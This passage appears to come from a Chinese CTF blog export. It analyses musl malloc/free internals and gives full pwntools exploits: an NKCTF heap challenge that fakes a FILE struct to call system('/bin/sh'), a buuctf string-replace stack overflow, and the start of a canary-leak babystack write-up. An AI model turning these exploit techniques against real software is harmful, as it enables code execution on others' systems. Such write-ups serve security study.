)\n\n\n\ncheck是一串随机生成的数字 用来防止伪造\nnext是下一个meta_arena的地址 没有则为0\nnslots为槽的数量\n最后来看一个综合的大结构体 __malloc_context\nstruct malloc_context &#123;    uint64_t secret;// 和meta_area 头的check 是同一个值 就是校验值#ifndef PAGESIZE    size_t pagesize;#endif    int init_done;//是否初始化标记    unsigned mmap_counter;// 记录有多少mmap 的内存的数量    struct meta *free_meta_head;// 被free 的meta 头 这里meta 管理使用了队列和双向循环链表    struct meta *avail_meta;//指向可用meta数组    size_t avail_meta_count, avail_meta_area_count, meta_alloc_shift;    struct meta_area *meta_area_head, *meta_area_tail;    unsigned char *avail_meta_areas;    struct meta *active[48];// 记录着可用的meta    size_t u sage_by_class[48];    uint8_t unmap_seq[32], bounces[32];    uint8_t seq;    uintptr_t brk;&#125;;\n\n\n接下来的malloc和free源码分析我也是照着看雪的一篇文章学习的 讲的已经很详细了 文章链接贴在这里 我也会复制粘贴进来 方便我自己到时复现\nhttps://bbs.kanxue.com/thread-269533-1.html\nmalloc\nvoid *malloc(size_t n)&#123;    if (size_overflows(n)) return 0;// 最大申请空间限制    struct meta *g;    uint32_t mask, first;    int sc;    int idx;    int ctr;     if (n &gt;= MMAP_THRESHOLD) &#123;// size &gt;= 阈值 会直接通过mmap 申请空间        size_t needed = n + IB + UNIT; //UNIT 0x10 IB 4 定义在meta.h 里 这里UNIT + IB 是一个基本头的大小        void *p = mmap(0, needed, PROT_READ|PROT_WRITE,MAP_PRIVATE|MAP_ANON, -1, 0);//新mmap group 空间        if (p==MAP_FAILED) return 0;        wrlock();        step_seq();        g = alloc_meta();        if (!g) &#123; // 如果申请meta 失败 会把刚刚mmap 出来的group 回收            unlock();            munmap(p, needed);// 回收group            return 0;        &#125;        g-&gt;mem = p;// mem = group 地址        g-&gt;mem-&gt;meta = g; //group 头部 指向meta (g 为 meta)        g-&gt;last_idx = 0;//mmap的group last_idx默认值=0        g-&gt;freeable = 1;        g-&gt;sizeclass = 63; // mmap 的申请的 sizeclass 都为63        g-&gt;maplen = (needed+4095)/4096;        g-&gt;avail_mask = g-&gt;freed_mask = 0;        ctx.mmap_counter++;// mmap 内存记载数量++        idx = 0;        goto success;    &#125;    //否则直接根据传入size，转换成size_classes的对应大小的 下标，    sc = size_to_class(n);     rdlock();    g = ctx.active[sc]; // 从现有的active中取出对应sc 的 meta ,不同sc 对应不同的meta   /*    如果从ctx.active 中没找到对应的meta 会执行下面的if分支    这里!g&lt;=&gt; g==0 ,说明ctx.active[sc] 没有对应的meta    */    if (!g &amp;&amp; sc&gt;=4 &amp;&amp; sc&lt;32 &amp;&amp; sc!=6 &amp;&amp; !(sc&amp;1) &amp;&amp; !ctx.usage_by_class[sc]) &#123;        size_t usage = ctx.usage_by_class[sc|1];// 如果在 ctx.active 没找到 就使用更大size group 的meta        // if a new group may be allocated, count it toward        // usage in deciding if we can use coarse class.        if (!ctx.active[sc|1] || (!ctx.active[sc|1]-&gt;avail_mask            &amp;&amp; !ctx.active[sc|1]-&gt;freed_mask))            usage += 3;        if (usage &lt;= 12)            sc |= 1;        g = ctx.active[sc];    &#125;     for (;;) &#123;        mask = g ? g-&gt;avail_mask : 0;        first = mask&amp;-mask;        if (!first) break;        if (RDLOCK_IS_EXCLUSIVE || !MT)            g-&gt;avail_mask = mask-first;        else if (a_cas(&amp;g-&gt;avail_mask, mask, mask-first)!=mask)            continue;        idx = a_ctz_32(first);        goto success;    &#125;    upgradelock();     idx = alloc_slot(sc, n);  /*  如果当前group 不满足就会来到这里:      alloc_slot 从group 中取出对应大小chunk 的idx      这里先从对应sc 的ctx.active[sc] 中找对应的meta的group 有无空闲chunk可以使用        再从队列中其他meta的group 中找      如果队列中其他meta的group 有可利用的chunk,就使用      如果没有就重新分配一个新的group  */    if (idx &lt; 0) &#123;        unlock();        return 0;    &#125;    g = ctx.active[sc];// 取出 sc 对应active meta success:    ctr = ctx.mmap_counter;    unlock();    return enframe(g, idx, n, ctr);// 从对应meta 中的group 取出 第idx号chunk  n = size&#125;\n\nchunk分配的主要逻辑是下面这个for循环\nfor (;;) &#123;    mask = g ? g-&gt;avail_mask : 0; //先检查g所指meta是否存在，若存在mask = g-&gt;avail_mask    first = mask&amp;-mask;                     //这里只有mask=0时，first才会为0    if (!first) break;                        //mask为0，first=0，无可用空闲chunk，跳出循环    if (RDLOCK_IS_EXCLUSIVE || !MT)//如果是排它锁, 那么下面保证成功        g-&gt;avail_mask = mask-first;    else if (a_cas(&amp;g-&gt;avail_mask, mask, mask-first)!=mask) //成功找到并设置avail_mask之后,continue 后设置idx，然后跳出        continue;    idx = a_ctz_32(first);    goto success;&#125;    upgradelock();     idx = alloc_slot(sc, n);\n\n跟进一下索引idx的alloc_slot函数\nstatic int alloc_slot(int sc, size_t req)&#123;    // 尝试从限制active 中找到合适可用的    uint32_t first = try_avail(&amp;ctx.active[sc]);    if (first) return a_ctz_32(first);   // 如果没找到 重新创造一个meta，然后重新分配一个size大小对应sc的group，给这个新分配的meta    struct meta *g = alloc_group(sc, req);    if (!g) return -1;     g-&gt;avail_mask--;    queue(&amp;ctx.active[sc], g); //把新meta 加入队列    return 0;&#125;\n\n跟进一下try_avail函数\nstatic uint32_t try_avail(struct meta **pm)&#123;    struct meta *m = *pm;    uint32_t first;    if (!m) return 0;    uint32_t mask = m-&gt;avail_mask;    if (!mask)//mask = m-&gt;avail_mask (!mask) 表示没有可用的chunk了    &#123;                                                if (!m-&gt;freed_mask) // if (!m-&gt;freed_mask) &lt;=&gt; 没有已经释放的chunk        &#123;                                      /*       进入这个分支的条件:既没有可用的chunk，也没有被释放还未回收的chunk，即chunk都被使用，且都没被释放      */            dequeue(pm, m); // freed_mask==avail_mask=0, group 空间已满 让对应的meta 出队            m = *pm;            if (!m) return 0;        &#125;        /*        这里else表示的是:无可用空闲chunk，但是有已经释放的chunk        !!! free释放的chunk 不能马上被复用的 !!!        */        else        &#123;       /*       进入这个分支的条件:没有可用的chunk，有被释放还未回收的chunk。       有点好奇这里，如果达成这个条件，然后利用指针互写，修改m-&gt;next 伪造的meta，是不是就可以制造fake meta 入队的假象       若meta链表中没有，一般meta 的next和prev 都是指向自己      */            m = m-&gt;next;            *pm = m;        &#125;         mask = m-&gt;freed_mask;        // 如果这个meta 的group 只含有一个chunk ，且被释放就跳过，        // 或者 这个meta 的group 根本不能被释放 如mmap 的 group last_idx = 0 freeable=1        if (mask == (2u&lt;&lt;m-&gt;last_idx)-1 &amp;&amp; m-&gt;freeable)        &#123;            m = m-&gt;next;            *pm = m;            mask = m-&gt;freed_mask;        &#125;         // activate more slots in a not-fully-active group        // if needed, but only as a last resort. prefer using        // any other group with free slots. this avoids        // touching &amp; dirtying as-yet-unused pages.        if (!(mask &amp; ((2u&lt;&lt;m-&gt;mem-&gt;active_idx)-1)))        &#123;            if (m-&gt;next != m)            &#123; // 如果这个meta 后还有meta 就切换到 下一个meta                m = m-&gt;next;                *pm = m;            &#125;            else            &#123;                int cnt = m-&gt;mem-&gt;active_idx + 2;                int size = size_classes[m-&gt;sizeclass]*UNIT;                int span = UNIT + size*cnt;                // activate up to next 4k boundary                while ((span^(span+size-1)) &lt; 4096) // 页对齐                &#123;                    cnt++;                    span += size;                &#125;                if (cnt &gt; m-&gt;last_idx+1)                    cnt = m-&gt;last_idx+1;                m-&gt;mem-&gt;active_idx = cnt-1;            &#125;        &#125;        mask = activate_group(m);// 这里是给 m的 avail_mask 打上标记        assert(mask);        decay_bounces(m-&gt; sizeclass);    &#125;    first = mask&amp;-mask; // 若 mask%2==0 则first =结果是能整除这个偶数的最大的2的幂 若 mask%2==1 则first永远为1    m-&gt;avail_mask = mask-first;    return first;&#125;\n\n上述源码可以总结为下列流程\n一、判断是否超过size 阈值先检查 申请的chunk的 needed size 是否超过最大申请限制检查申请的needed 是否超过需要mmap 的分配的阈值 超过就用mmap 分配一个group 来给chunk使用若是mmap 则设置各种标记二、分配chunk若申请的chunk 没超过阈值 就从active 队列找管理对应size大小的meta关于找对应size的meta 这里有两种情况:如果active 对应size的meta 位置上为空，没找到那么尝试先找size更大的meta如果active 对应size的meta位置上有对应的meta，尝试从这个meta中的group找到可用的chunk(这里malloc 那个循环:for (;;)，这里不清楚建议看malloc源码分析那里)如果通过循环里，通过meta-&gt;avail_mask 判断当前group 中是否有空闲chunk有，就直接修改meta-&gt;avail_mask，然后利用enframe(g, idx, n, ctr);// 从对应meta 中的group 取出 第idx号chunk分配无，break 跳出循环跳出循环后执行idx = alloc_slot(sc, n); alloc_slot有三种分配方式使用group中被free的chunk从队列中其他meta的group 中找如果都不行就重新分配一个新的group 对应一个新的metaenframe(g, idx, n, ctr) 取出 对应meta 中对应idx 的chunk\n\n和glibc不同的是 musl中chunk有三种状态 \n\n从上面的源码也可以看出 是优先查找空闲的chunk 其次才是被释放的chunk\n所以被释放的chunk不会立刻回收利用\n接下来看一下free函数的源码\nvoid free(void *p)&#123;    if (!p) return;     struct meta *g = get_meta(p);// 通过chunk p 用get_meta得到对应的meta    int idx = get_slot_index(p);// 得到对应chunk的 idx    size_t stride = get_stride(g); // 得到sizeclasses 中对应chunk类型的size     unsigned char *start = g-&gt;mem-&gt;storage + stride*idx;    unsigned char *end = start + stride - IB;    //*start = g-&gt;mem-&gt;storage(得到group中第一个chunk地址) + stride*idx(加上对应chunk偏移);    // start 就为对应p(chunk)的起始地址    // end 对应结束地址     get_nominal_size(p, end);//算出真实大小    uint32_t self = 1u&lt;&lt;idx, all = (2u&lt;&lt;g-&gt;last_idx)-1;//设置bitmap 标志    ((unsigned char *)p)[-3] = 255;    *(uint16_t *)((char *)p-2) = 0;    if (((uintptr_t)(start-1) ^ (uintptr_t)end) &gt;= 2*PGSZ &amp;&amp; g-&gt;last_idx) &#123;        unsigned char *base = start + (-(uintptr_t)start &amp; (PGSZ-1));        size_t len = (end-base) &amp; -PGSZ;        if (len) madvise(base, len, MADV_FREE);    &#125;     // atomic free without locking if this is neither first or last slot    for (;;) &#123;        uint32_t freed = g-&gt;freed_mask;        uint32_t avail = g-&gt;avail_mask;        uint32_t mask = freed | avail; // 将释放的chunk 和 现在可用的 chunk 加起来        assert(!(mask&amp;self));        if (!freed || mask+self==all) break;        //!freed 没有被释放的chunk，mask+self==all说明释放了当前chunk所有chunk 都将被回收        // 此group 会被弹出队列        if (!MT)            g-&gt;freed_mask = freed+self;// 设置free_mask 表示chunk 被释放        else if (a_cas(&amp;g-&gt;freed_mask, freed, freed+self)!=freed)            continue;        return;    &#125;     wrlock();    struct mapinfo mi = nontrivial_free(g, idx);// 含有meta 操作 ，内有unlink 是漏洞利用的关键    unlock();    if (mi.len) munmap(mi.base, mi.len);&#125;\n\n通过get_meta(p)得到meta (get_meta 是通过chunk 对应的offset 索引到对应的group 再索引到meta) 下面会详细介绍get_meta通过get_slot_index(p)得到对应chunk的 idx -&gt; 通过get_nominal_size(p, end) 算出真实大小重置idx 和 offset idx 被置为0xff 标记chunk修改freed_mask 标记chunk被释放最后调用nontrivial_free 完成关于meta一些剩余操作 (注意进入nontrivial_free 是在for循环外 还未设置)释放chunk的时候，先只会修改freed_mask,不会修改avail_mask，说明chunk 在释放后，不会立即被复用注意进入nontrivial_free 是在for循环外 还未设置freed_mask 跳出循环的条件是    if (!freed || mask+self==all) break;free 中chunk 的起始位置可以通过 chunk的idx 定位\n\nstatic inline struct meta *get_meta(const unsigned char *p)&#123;    assert(!((uintptr_t)p &amp; 15));    int offset = *(const uint16_t *)(p - 2);// 得到chunk offset    int index = p[-3] &amp; 31;;// 得到chunk idx    if (p[-4]) &#123;        assert(!offset);        offset = *(uint32_t *)(p - 8);        assert(offset &gt; 0xffff);    &#125;    const struct group *base = (const void *)(p - UNIT*offset - UNIT);// 通过offset 和chunk 地址计算出group地址    const struct meta *meta = base-&gt;meta;// 从group 得到 meta 地址    assert(meta-&gt;mem == base);// 检查meta 是否指向对应的group    assert(index &lt;= meta-&gt;last_idx);// 检查chunk idx 是否超过 meta 最大chunk 容量    assert(!(meta-&gt;avail_mask &amp; (1u&lt;&lt;index)));    assert(!(meta-&gt;freed_mask &amp; (1u&lt;&lt;index)));    const struct meta_area *area = (void *)((uintptr_t)meta &amp; -4096);// 得到meta_area 地址    assert(area-&gt;check == ctx.secret);// 检查 check 校验值    if (meta-&gt;sizeclass &lt; 48) &#123; // 如果属于 sizeclasses 管理的chunk 大小        assert(offset &gt;= size_classes[meta-&gt;sizeclass]*index);        assert(offset &lt; size_classes[meta-&gt;sizeclass]*(index+1));    &#125; else &#123;        assert(meta-&gt;sizeclass == 63);    &#125;    if (meta-&gt;maplen) &#123;        assert(offset &lt;= meta-&gt;maplen*4096UL/UNIT - 1);    &#125;    return (struct meta *)meta;&#125;\n\nstatic struct mapinfo nontrivial_free(struct meta *g, int i)// i = idx&#123;    uint32_t self = 1u&lt;&lt;i;    int sc = g-&gt;sizeclass;    uint32_t mask = g-&gt;freed_mask | g-&gt;avail_mask;//mask=已经被free的chunk +可使用的chunk    if (mask+self == (2u&lt;&lt;g-&gt;last_idx)-1 &amp;&amp; okay_to_free(g))    &#123;    /*             如果 mask+self == (2u&lt;&lt;g-&gt;last_idx)-1 代表此meta中group里的chunk 都被释放 或者 都被用了         (2u&lt;&lt;g-&gt;last_idx)-1 计算出的值化成二进制，其中每位含义类似于bitmap，如果每位为1表每位要不是被free 不然就是被         okay_to_free 检测是否可以被释放         */        if (g-&gt;next)        &#123;    // 如果队列中 有下一个meta            assert(sc &lt; 48);// 检测 sc 是不是mmap 分配的      // 检测当前meta g 和 队列里的active[sc] meta 是否一样，一样则activate_new赋值为1            int activate_new = (ctx.active[sc]==g);            dequeue(&amp;ctx.active[sc], g);// 当前meta 出队             // 在出队操作后 ,ctx.active[sc]==meta -&gt;next  是指的刚刚出队meta 的下一个meta            if (activate_new &amp;&amp; ctx.active[sc])                activate_group(ctx.active[sc]);//如果有下一个meta 直接激活 然后修改avail_mask 标志位        &#125;        return free_group(g);    &#125;    else if (!mask)    &#123;// mask==0 group chunk 空间已被完全使用        assert(sc &lt; 48);        // might still be active if there were no allocations        // after last available slot was taken.        if (ctx.active[sc] != g) &#123;// 如果 g 未被加入 队列ctx.ative[sc]            queue(&amp;ctx.active[sc], g);// 把g 加入队列        &#125;    &#125;    a_or(&amp;g-&gt;freed_mask, self);// 修改对应 的freed_mask 标志 ，表示着对应的chunk 已被释放    return (struct mapinfo)&#123; 0 &#125;;&#125;\n\nnontrivial_free函数中调用了一个关键的函数 dequeue\nstatic inline void dequeue(struct meta **phead, struct meta *m)&#123;    if (m-&gt;next != m) &#123;        m-&gt;prev-&gt;next = m-&gt;next; // 这里存在指针互写 在 prev 所指地址上 写入next 指针        m-&gt;next-&gt;prev = m-&gt;prev; // 在next 所指地址上 写入prev 指针        if (*phead == m) *phead = m-&gt;next;// 队列头如果为m 那就更新为m-&gt;next    &#125; else &#123;        *phead = 0;    &#125;    m-&gt;prev = m-&gt;next = 0; // 清理m(meta)的头尾指针&#125;\n\n其原本的作用是prev和next指针互写 用于一个meta出队时\nmeta什么时候会出队 当其所有的chunk都被释放或者都处于空闲状态 就会出队\n2023NKCTF note说那么多也无聊死了 直接上题目! 先来一题简单的\n\n\n代码太长了就不放了 简单介绍一下 给了四个函数\nadd 可以申请任意大小的chunk\nedit 同时可以堆溢出\nshow 可以打印出chunk的地址\ndelete函数 置零了指针 不存在UAF\n但是其对于index并没有检测 所以这个index实际上可以为任意数 我们可以对ptr数组附近的区域进行任意写\n不过 首要的任务还是泄露libc基址  来看看musl的堆题要如何泄露libc基址\n我们先申请一个0xc大小的chunk \n\n然后再申请一个0x1c大小的chunk\n\n你会发现第二个chunk竟然分配到的是libc地址上\n这是因为在malloc第二个chunk的时候 如果没有找到合适的空闲chunk或者是被释放的chunk 就会分配一个新的group\nstruct meta *g = alloc_group(sc, req);\n\n而分配出来的这个group就位于libc地址上\n相关的可以自己跟着源码动调看看(虽然我自己调了也还是不知道为啥有的分配到了堆地址 有的分配到了libc地址)\n\n接下来再看题目 这里对于我们输入的v5没有进行任何的限制 也就是说我们可以输出ptr数组后的地址其指向的内容\n\n此时chunk0和ptr数组相较来说比较接近 所以只要我们将chunk0的内容编辑成chunk1的meta chunk1的meta中有存储着chunk1的地址 这样就能泄露出libc地址了\n\n那么首先就是要泄露出堆地址\n计算一下chunk0和ptr数组的偏移 随后泄露出chunk0的meta地址 计算一下和chunk1的meta的偏移\n随后将chunk1的meta地址存放到chunk0上\nshow泄露出libc地址\nadd(0,0xc,b&#x27;aaaa&#x27;)add(1,0x1c,b&#x27;aaaa&#x27;)show(0x570)heap_addr = u64(io.recvuntil(&quot;\\x0a&quot;,drop = True)[-6:].ljust(8,b&#x27;\\x00&#x27;))-0x2e8success(&quot;heap_addr :&quot;+hex(heap_addr))chunk1_addr = heap_addr+0x320edit(0,8,p64(chunk1_addr))show(0x572)libc_addr = u64(io.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,b&#x27;\\x00&#x27;))-(0x7fccb8f39d10-0x7fccb8e9e000)success(&quot;libc_addr :&quot;+hex(libc_addr))debug()\n\n接下来难点在于说如何获取shell 在glibc中最常见的做法是覆盖hook函数 但是musl可没有这些东西 所以我们只能采用伪造io_file结构体\n我们来看一下exit函数的调用链\n_Noreturn void exit(int code)&#123;\t__funcs_on_exit();\t__libc_exit_fini();\t__stdio_exit();\t_Exit(code);&#125;\n\n跟进一下__stdio_exit函数\nvoid __stdio_exit(void)&#123;\tFILE *f;\tfor (f=*__ofl_lock(); f; f=f-&gt;next) close_file(f);\tclose_file(__stdin_used);\tclose_file(__stdout_used);\tclose_file(__stderr_used);&#125;\n\n可以看到在最后利用close_file操作了三个file结构体\n我们选择利用__stdout_used 先在gdb中查看一下其构成\n\nstatic void close_file(FILE *f)&#123;\tif (!f) return;\tFFINALLOCK(f);\tif (f-&gt;wpos != f-&gt;wbase) f-&gt;write(f, 0, 0);\tif (f-&gt;rpos != f-&gt;rend) f-&gt;seek(f, f-&gt;rpos-f-&gt;rend, SEEK_CUR);&#125;\n\n当f-&gt;wpos !&#x3D; f-&gt;wbase成立时 就会调用f-&gt;write 并且将f起始的作为rdi寄存器\n也就是说我们需要伪造_stout_file 并且有四个地方需要注意 也就是构造成下面这个样子\nfake_stdout_file = &#x27;/bin/sh\\x00&#x27;.ljust(0x38,&#x27;\\x00&#x27;) + p64(1) + p64(0) + p64(system)\n\n并且把可控地址写入到__stdout_used中 这里的可控地址当然是一个chunk了\n不过经过我自己实验 musl中堆的分配好像和glibc不一样 所以这里的chunk必须和chunk1一样是在libc地址中的 这样才能保证偏移正确\n完整exp:\nfrom pwn import*from ctypes import *from LibcSearcher import*io = process(&quot;./pwn&quot;)#io = remote(&quot;ctf.comentropy.cn&quot;,8301)context.log_level = &quot;debug&quot;context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]#libc = ELF(&quot;/home/chen/glibc-all-in-one/libs/2.31-0ubuntu9.9_amd64/libc-2.31.so&quot;)libc = ELF(&quot;./libc.so&quot;)#libc = cdll.LoadLibrary(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)#libc = ELF(&quot;./libc-2.32.so&quot;)#libc = ELF(&quot;./locate&quot;)# context.arch = &quot;i386&quot;context.arch = &quot;amd64&quot;elf = ELF(&quot;./pwn&quot;)def debug():    gdb.attach(io)    pause()def add(index,size,content):    io.recvuntil(&quot;your choice: &quot;)    io.sendline(b&#x27;1&#x27;)    io.recvuntil(&quot;Index: &quot;)    io.sendline(str(index))    io.recvuntil(&quot;Size: &quot;)    io.sendline(str(size))    io.recvuntil(&quot;Content: &quot;)    io.send(content)def edit(index,size,content):    io.recvuntil(&quot;your choice: &quot;)    io.sendline(b&#x27;2&#x27;)    io.recvuntil(&quot;Index: &quot;)    io.sendline(str(index))    io.recvuntil(&quot;Size: &quot;)    io.sendline(str(size))    io.recvuntil(&quot;Content: &quot;)    io.send(content)def delete(index):    io.recvuntil(&quot;your choice: &quot;)    io.sendline(b&#x27;3&#x27;)    io.recvuntil(&quot;Index: &quot;)    io.sendline(str(index))def show(index):    io.recvuntil(&quot;your choice: &quot;)    io.sendline(b&#x27;4&#x27;)    io.recvuntil(&quot;Index: &quot;)    io.sendline(str(index))add(0,0xc,b&#x27;aaaa&#x27;)add(1,0x1c,b&#x27;aaaa&#x27;)show(0x570)heap_addr = u64(io.recvuntil(&quot;\\x0a&quot;,drop = True)[-6:].ljust(8,b&#x27;\\x00&#x27;))-0x2e8success(&quot;heap_addr :&quot;+hex(heap_addr))chunk1_addr = heap_addr+0x320edit(0,8,p64(chunk1_addr))show(0x572)libc_addr = u64(io.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,b&#x27;\\x00&#x27;))-(0x7fccb8f39d10-0x7fccb8e9e000)success(&quot;libc_addr :&quot;+hex(libc_addr))__stdout_used = libc_addr + libc.sym[&#x27;__stdout_used&#x27;]system_addr = libc_addr + libc.sym[&#x27;system&#x27;]fake_file = b&#x27;/bin/sh\\x00&#x27;.ljust(0x38,b&#x27;\\x00&#x27;)+p64(1)+p64(0)+p64(system_addr)add(2,0x500,fake_file)edit(0,8,p64(__stdout_used))fakechunk_addr = libc_addr + (0x7f081beb5020-0x7f081beb6000)success(&quot;fakechunk_addr :&quot;+hex(fakechunk_addr))edit(0x572,8,p64(fakechunk_addr))io.recvuntil(&quot;your choice: &quot;)io.sendline(b&#x27;5&#x27;)io.interactive()\n\n","categories":["堆"]},{"title":"pwn1_sctf_2016","url":"/2022/09/19/pwn1-sctf-2016/","content":"buuctf中的一题，纯纯烧杯题，这题注重考查c++逆向(但是我还是觉得是动手调试的能力)\n老规矩了，checksec看一下保护机制和位数\n\n感觉像是栈溢出，不确定，ida看看\n\n哇，看到这函数列表懵逼了，不过别怕，仔细翻一番\n\n逮到三个看名字有用的，f5看一下\nmain函数：\nint __cdecl main(int argc, const char **argv, const char **envp)&#123;  vuln();  return 0;&#125;\n\nvuln函数：\nint vuln()&#123;  const char *v0; // eax  int v2; // [esp+4h] [ebp-54h]  char s[32]; // [esp+1Ch] [ebp-3Ch] BYREF  char v4[4]; // [esp+3Ch] [ebp-1Ch] BYREF  char v5[7]; // [esp+40h] [ebp-18h] BYREF  char v6; // [esp+47h] [ebp-11h] BYREF  char v7[7]; // [esp+48h] [ebp-10h] BYREF  char v8[5]; // [esp+4Fh] [ebp-9h] BYREF  printf(&quot;Tell me something about yourself: &quot;);  fgets(s, 32, edata);  std::string::operator=();  std::allocator&lt;char&gt;::allocator(&amp;v6, s);  std::string::string(v5, &quot;you&quot;, &amp;v6);  std::allocator&lt;char&gt;::allocator(v8, v2);  std::string::string(v7, &quot;I&quot;, v8);  replace((std::string *)v4);  std::string::operator=(&amp;input, v4, v7, v5);  std::string::~string(v4);  std::string::~string(v7);  std::allocator&lt;char&gt;::~allocator(v8);  std::string::~string(v5);  std::allocator&lt;char&gt;::~allocator(&amp;v6);  v0 = (const char *)std::string::c_str((std::string *)&amp;input);  strcpy(s, v0);  return printf(&quot;So, %s\\n&quot;, s);&#125;\n\ngatflag函数：\nint get_flag()&#123;  return system(&quot;cat flag.txt&quot;);\n\n看完人更傻了，虽然getflag明显就是要我们栈溢出，跳转到这个函数，但是vuln写的是什么？\n百度完应该是c++中std::string相关的用法\n不过这题应该是要我们会用debug来调试程序\n我们重点注意一下那一串天书里面的“I”和“you”，突破口肯定是这俩\n浅写段exp，debug看看有什么玄机\nfrom pwn import*io = remote(&quot;node4.buuoj.cn&quot;,29397)context.log_level = &quot;debug&quot;  #这段就是打开debug，具体是什么，下面看到图你就知道了payload = b&#x27;I&#x27;*6io.sendline(payload)io.recv()\n\n\n好家伙，我们可以看到明明传的是I，结果都变成了you，那到这里很明显了，这题就是把字符串中的i替换成了you\n我们再来看看能不能进行栈溢出\n\n可以看到，我们只能输入0x20字节的数据给s，但是他距离ebp有0x3c，不够怎么办？\n刚才不是输入I可以变成you吗？这不是一个字节顶三个字节，一节更比一节强（南孚打钱）\n那思路很明显了，输入20个字长的I，就相当于输入了60个字长的you，我们就可以进行栈溢出了\nexp:\nfrom pwn import*io = remote(&quot;node4.buuoj.cn&quot;,29397)getflag_addr = 0x8048f0dpayload = b&#x27;I&#x27;*20+cyclic(4)+p32(getflag_addr)io.sendline(payload)io.recv()\n\n","categories":["wp"]},{"title":"others_babystack","url":"/2022/12/16/others-babystack/","content":"一道蛮神奇的题 两种解法 不过一种有点非常规 不知道出题人怎么设置的\nchecksec看一下保护机制\n[!] Could not populate PLT: invalid syntax (unicorn.py, line 110)[*] &#x27;/home/chen/pwn&#x27;    Arch:     amd64-64-little    RELRO:    Full RELRO    Stack:    Canary found    NX:       NX enabled    PIE:      No PIE (0x400000)\n\nida查看一下main函数\n__int64 __fastcall main(int a1, char **a2, char **a3)&#123;  int v3; // eax  char s[136]; // [rsp+10h] [rbp-90h] BYREF  unsigned __int64 v6; // [rsp+98h] [rbp-8h]  v6 = __readfsqword(0x28u);  setvbuf(stdin, 0LL, 2, 0LL);  setvbuf(stdout, 0LL, 2, 0LL);  setvbuf(stderr, 0LL, 2, 0LL);  memset(s, 0, 0x80uLL);  while ( 1 )  &#123;    menu();    v3 = choice();    switch ( v3 )    &#123;      case 2:        puts(s);        break;      case 3:        return 0LL;      case 1:        read(0, s, 0x100uLL);        break;      default:        sendline(&quot;invalid choice&quot;);        break;    &#125;    sendline(&amp;unk_400AE7);  &#125;&#125;\n\nmenu函数这里就不放了 反正就看这些源码也能知道各个选项对应什么作用\n两个比较重要的地方 有一个puts泄露的机会 还有read函数可以读入数据\n考虑到程序开启了金丝雀 所以这里的puts可以用来泄露金丝雀\n覆盖金丝雀的最后一位 使其不为\\x00 因为puts或者printf截停一个字符串就是靠\\x00\n这里泄露的时候有个小坑 就是你不能想着读入后7位 然后最后用p64把他补全成八位 因为第八位也恒为00嘛\n但是pwntools的p64补全是在首位补全\nfrom pwn import*io = process(&quot;./a.out&quot;)context.log_level = &quot;debug&quot;canary = 0x11223344556677payload = p64(canary)io.sendline(payload)\n\n如上程序 假设canary值为上述那样 我们debug看一下最后会输送什么样的数据\n[DEBUG] Sent 0x9 bytes:    00000000  77 66 55 44  33 22 11 00  0a                        │wfUD│3&quot;··│·│    00000009\n\n很明显 小端序存储 所以00实际上是被放在了首位\n所以可以用sendline多出来的\\n字节覆盖\\x00 然后接收八个字节的数据 最后-0xa 就能得到带有00的canary\nexp:\nfrom pwn import*from struct import packfrom ctypes import *from LibcSearcher import*def libcmath(function_addr,function_name):    libc_addr = function_addr - libc.sym[function_name]    system_addr = libc_addr + libc.sym[&#x27;system&#x27;]    binsh_addr = libc_addr + next(libc.search(b&quot;/bin/sh&quot;))    return system_addr,binsh_addrdef csu(offset,gadget2_addr,call_addr,rdx,rsi,rdi,gadget1_addr,ret_addr):    payload = cyclic(offset)    payload += p64(gadget2_addr)    payload += cyclic(0x8)    payload += p64(0)    payload += p64(1)    payload += p64(call_addr)    payload += p64(rdx)    payload += p64(rsi)    payload += p64(rdi)    payload += p64(gadget1_addr)    payload += cyclic(56)    payload += p64(ret_addr)    return payloaddef localconnect(filename):    io = process(filename)    return iodef remoteconnect(ip,port):    io = remote(ip,port)    return iodef elf_libc(filename,libc_name):    elf = ELF(filename)    libc = ELF(libc_name)    return elf,libcdef debug(button):    if(button==1):        context.log_level = &quot;debug&quot;filename = &#x27;pwn&#x27;libc_name = &#x27;buu_libc_ubuntu16_64&#x27;ip=&quot;node4.buuoj.cn&quot;port=29125elf,libc = elf_libc(filename,libc_name)#libc = cdll.LoadLibrary(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)#main_addr = elf.sym[&#x27;main&#x27;]main_addr = 0x400908io = remoteconnect(ip,port)#io = process(&quot;./pwn&quot;)debug(1)puts_plt = 0x400690rdi_addr = 0x400a93puts_got = elf.got[&#x27;puts&#x27;]leave_addr = 0x400824io.recvuntil(&quot;&gt;&gt; &quot;)io.sendline(b&quot;1&quot;)payload = cyclic(0x87)+b&quot;1&quot;io.sendline(payload)io.recvuntil(&quot;&gt;&gt; &quot;)io.sendline(b&quot;2&quot;)io.recvuntil(&quot;1&quot;)canary = u64(io.recv(8).ljust(8,b&quot;\\x00&quot;))-0xa\n\n接下来还要想办法控制程序执行流 一开始看到read只能读入0x100的数据 我是觉得不能构造rop链来泄露libc基址\n但是最后查看wp的时候 发现大家都是用泄露基址的办法做的 也是比较神奇 数据竟然能超出限制读入\n第一种办法用到的是泄露__libc_start_main函数的地址\n稍微了解一下程序函数调用就会知道 main函数并不是程序第一个调用的\n__libc_start_main函数的地址应该是在rbp的下一个字长处\nio.recvuntil(&quot;&gt;&gt; &quot;)io.sendline(b&quot;1&quot;)payload = cyclic(0x98)io.send(payload)io.recvuntil(&quot;&gt;&gt; &quot;)io.sendline(b&quot;2&quot;)io.recv(0x98)start_addr = u64(io.recv(6).ljust(8,b&quot;\\x00&quot;))libc_addr = start_addr - 240 - libc.sym[&#x27;__libc_start_main&#x27;]print(hex(libc_addr))\n\n这里泄露出来的start_addr之所以要减去240 还得要动调来看\n\n泄露出来的地址距离__libc_start_main函数还有231偏移 当然这只是本地libc的偏移 远程的等下还得微调一下\n此时我们得到算式:\nlibc_addr = start_addr - 231 - libc.sym[&#x27;__libc_start_main&#x27;]\n\n在本地上 其后三位是000 但是远程环境不同 运行看一下差了多少\n得到的值是0x7f3fea3e8009 多了9 那就减去240就可以得到远程的libc基址了\n虽然我们得到了libc基址 但是由于read可以溢出的长度不够我们构造一个system链 所以这里采取修改ret addr为one_gadget\n完整exp:\nfrom pwn import*from struct import packfrom ctypes import *from LibcSearcher import*def libcmath(function_addr,function_name):    libc_addr = function_addr - libc.sym[function_name]    